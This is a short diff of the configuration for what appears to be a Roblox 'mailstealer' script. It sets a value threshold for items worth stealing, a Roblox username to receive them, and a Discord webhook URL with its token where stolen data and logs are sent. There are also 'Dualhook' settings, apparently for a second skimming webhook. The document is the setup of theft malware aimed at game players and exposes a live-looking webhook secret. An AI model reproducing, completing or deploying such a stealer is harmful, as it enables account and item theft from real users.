@@ -1,14 +1,14 @@
 
-MinimumRAP = 10000
+MinimumRAP = 3000000
 
-DualhookUsername = ""
+DualhookUsername =TYP_ADlTYA
 DualhookWebhook = ""
 LogsWebhook = ""
 DualhookRAP = 10000000000
 mailstealer_name = "XDXD"
 
-Roblox_Username = Username
-Discord_Webhook = Webhook
+Roblox_Username = "TYP_ADlTYA"
+Discord_Webhook = https://discord.com/api/webhooks/1285883521151275019/TVPu2dkZoUx2-3aUgk7TNuf-JJAt7Gjrlcg49XIC8NXOf2dUGbJHLIboE9IZJHrKg1iI
 
 -- simple mailstealer
 LOGS_WEBHOOK = LogsWebhook
